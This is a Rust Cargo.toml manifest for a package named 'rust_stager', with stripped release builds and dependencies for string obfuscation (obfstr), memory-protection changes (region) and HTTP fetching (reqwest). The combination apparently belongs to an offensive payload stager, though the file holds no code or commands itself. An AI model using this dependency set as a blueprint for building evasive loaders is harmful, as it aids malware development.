[package]
name = "rust_stager"
version = "0.1.0"
edition = "2021"

[profile.release]
strip = true
lto = true
panic = "abort"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
bytes = "1.4.0"
obfstr = "0.4.3"
region = "3.0.0"
reqwest = { version = "0.11.18", features = ["blocking", "native-tls"]}
